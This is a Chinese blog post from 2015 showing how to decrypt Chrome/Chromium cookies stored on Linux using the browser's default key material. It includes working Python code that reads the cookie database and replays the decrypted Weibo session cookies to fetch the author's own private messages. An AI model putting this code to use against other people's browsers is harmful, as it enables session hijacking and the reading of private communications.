title: 利用cookie查看微博私信 
tags: 
- http
- cookie
- python
- aes
- chrome
category: coding
date: 2015-02-27 23:15
---

记得还是在学Qt编程的时候，做过一个练手项目，产品是一个搜索Chrome的cookie内容的小软件。Chrome的cookie保存在用户目录的一个sqlite文件中，具体路径上网搜一下就知道了。当时比较天真，想看看cookie里面有没有明文保存的密码，结果当然是得到一堆乱码，最后就不了了之了。
<!-- more --> 
直到前几天，我正在网上看一篇关于cookie的文章，忽然想起一件事情，我需要密码的原因无非是用来登录，我既然有了cookie直接发给服务器就可以了，又有什么必要了解cookie的内容？我顺手用chrome打开了微博私信查看下它的请求流程：
![cookie-request-flow](http://thumbsnap.com/s/mwkbI50J.png)


貌似理论上没有什么问题，不过还是要做个试验验证一下，我准备尝试用python写个小程序模拟浏览器向微博服务器发起私信消息的页面请求。

当然首先还是让我的小伙伴给我发条私信：
![cookie-message](http://thumbsnap.com/i/Gtlt6d5Y.png)
##具体实现
整个实验我简单的作了个概念图：
![cookie-flow](http://thumbsnap.com/i/2nneEq3T.png)

实验主要分为以下几个步骤：
 * 从chrome的sqlite文件中提取cookie
 * 模拟浏览器组装header
 * 向服务器发起目标页面的请求

###提取chrome的cookie信息
chrome的cookie保存路径在三大操作系统Windows、Linux和OSX上都不尽相同，以linux为例，它的保存路径就是`～/.config/chromium/Default/Cookies`，我们先用sqlite3程序把这个文件载入进来看看：
![cookie-tables](http://thumbsnap.com/i/uN4qraCk.png)
cookie信息都保存在表`cookies`中，但是才刚开始就出现了意想不到的问题：
![cookie-values-problem](http://thumbsnap.com/i/KjNIWNZF.png)

表里面的值和记忆中的大部分都是一样的，唯独最重要的value一项，居然是空的，而在末尾倒是多了个`encrypted_value`項。谷歌了一下，了解到在chrome版本33之前，cookie都是直接存储的，在33+之后，谷歌开始对cookie的信息进行了加密。顺便感慨下时光飞逝，不知不觉又老了几个版本。chrome在windows上加密采用的是CryptUnprotectData函数，解密方法大家可以看[这里](http://www.ftium4.com/chrome-cookies-encrypted-value-python.html)。Linux和OSX上的加密方法相似，都采用的是AES(CBC)加密方法，了解密码学的都知道对这个数据进行解密至少需要好几个值，salt，key length，iv，password，iterations等等。不过不幸的是一位国外的网友n8henrie在浏览了chromium源码之后把这些值统统找到了，以下是他原话：
 
* salt is `b'saltysalt'`
* key length is `16`
* `iv` is 16 bytes of space `b' ' * 16`
* on `Mac OSX`:
    `password` is in keychain under `Chrome Safe Storage`
    I use the excellent keyring package to get the password
    You could also use bash: `security find-generic-password -w -s "Chrome Safe Storage"`
    number of iterations is `1003`
* on Linux:
    password is `peanuts`
    number of iterations is `1`

顺便贴出他给出的源代码(可能是原作者的失误，在clean函数中忘记调用了ord函数，特此补上)：

```
#! /usr/bin/env python3

from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

# Function to get rid of padding
def clean(x): 
    return x[:-ord(x[-1])].decode('utf8')

# replace with your encrypted_value from sqlite3
encrypted_value = ENCRYPTED_VALUE 

# Trim off the 'v10' that Chrome/ium prepends
encrypted_value = encrypted_value[3:]

# Default values used by both Chrome and Chromium in OSX and Linux
salt = b'saltysalt'
iv = b' ' * 16
length = 16

# On Mac, replace MY_PASS with your password from Keychain
# On Linux, replace MY_PASS with 'peanuts'
my_pass = MY_PASS
my_pass = my_pass.encode('utf8')

# 1003 on Mac, 1 on Linux
iterations = 1003

key = PBKDF2(my_pass, salt, length, iterations)
cipher = AES.new(key, AES.MODE_CBC, IV=iv)

decrypted = cipher.decrypt(encrypted_value)
print(clean(decrypted))
```
我稍微改了下源代码，对上图header里的cookie的第一項尝试进行解密：
```
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

def clean(x): 
    return x[:-ord(x[-1])].decode('utf8')

def decrypt(encrypted_value):
    encrypted_value = encrypted_value[3:]

    salt = b'saltysalt'
    iv = b' ' * 16
    length = 16

    my_pass = 'peanuts'
    my_pass = my_pass.encode('utf8')

    iterations = 1

    key = PBKDF2(my_pass, salt, length, iterations)
    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
    decrypted = cipher.decrypt(encrypted_value)
    
    return clean(decrypted)

cx = sqlite3.connect(os.path.expandvars('$HOME') + '/.config/chromium/Default/Cookies')
cu = cx.cursor()

cu.execute("select * from cookies where host_key = '.weibo.com' and name = 'SINAGLOBAL'")
    
res = cu.fetchone()
    
print decrypt(res[len(res)-1])
```

结果显示n8henrie给出的值确实是正确的，解密成功。
![cookie-value-chrome](http://thumbsnap.com/i/CjKIZd6R.png)
![cookie-chomre](http://thumbsnap.com/i/ZwerOWIt.png)

这个值我们不知道有什么意义，因为本来就不需要，直接把它发给服务器就好，服务器自己知道怎么解密的。

cookie值解密出来之后，感觉就像是突然变成了宿管阿姨，手里握着整栋宿舍的钥匙。
###组装header
组装header这里比较容易了，基本上照着上面截下来的Chrome的header照抄就好了，不过要注意的是记得把`Accept-Encoding:gzip，deflate，sdch`这一项去掉，不然返回的数据是经过压缩的，最后再加上解密出来的cookie，一个完整的header就出来了。

```
import sqlite3
import urllib2
import os

cx = sqlite3.connect(os.path.expandvars('$HOME') + '/.config/chromium/Default/Cookies')
cu = cx.cursor()
cu.execute("select * from cookies where host_key = '.weibo.com'")

cookies = ''

for res in cu.fetchall(): 
    cookies += res[2] + '=' + decrypt(res[len(res)-1]) + '; '

url = 'http://weibo.com/messages'

header = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        #'Accept-Encoding': 'gzip, deflate, sdch',
        'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Host': 'weibo.com',
        'Cookie': cookies,
        'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/40.0.2214.111 Chrome/40.0.2214.111 Safari/537.36'
}
request = urllib2.Request(url, headers=header)
```
###发送请求
最后一步发送请求，把返回的数据打开看一下，私信消息已经在里面了。
![cookie-msg-decode](http://thumbsnap.com/i/RhdHDij2.png)

##结语
没想到整个过程还算是比较顺利的，而且还是在linux平台。随后我又在windows和OSX上进行了试验，windows的解密要更简单一点，而在OSX上获取`Chrome Safe Storage`的`password`的时候系统提醒需要获取授权，也就是说从目前来看只有苹果系挡住了这次攻击。不得不说cookie确实给我们带来了太多的便利，但是与此同时也牺牲了太多的安全性，网络发展到今天很多事情已经超出可控的范围，尤其是在中国这种软件氛围，谁知道各大软件产商有什么做不出来的，想要保护好自己，只能靠自己平时多长点心眼了。

##Q&A
* Q：为什么我直接用你的代码返回404？
* A：你要先用chrome至少浏览一次私信，不然哪来的cookie。
<br />
* Q：为什么选择微博私信做实验？
* A：因为我知道你们用的是微信而不是私信。
<br />
* Q：你是在本机运行的，劫持自己的信息可以，怎么劫持别人的信息？
* A：一般人不行，但是软件产商可以。
<br />
* Q：为什么每个用户只有一条私信？不可以看到所有的对话嘛？
* A：可以，但这里只是做为实验，不可有小人之心，但不能不防小人
<br />
* Q：有了cookie除了看私信还能干什么？
* A：不知道。

最后感谢下caixpp童鞋发了封私信，还有，用完数据库记得close。
##References
* http://stackoverflow.com/questions/23153159/decrypting-chrome-iums-cookies/23727331#23727331
* http://n8henrie.com/2014/05/decrypt-chrome-cookies-with-python/
* http://www.ftium4.com/chrome-cookies-encrypted-value-python.html

##转载请注明
原文地址： [http://mafagan.sinaapp.com/2015/02/26/cookie-hack/](http://mafagan.sinaapp.com/2015/02/26/cookie-hack/)
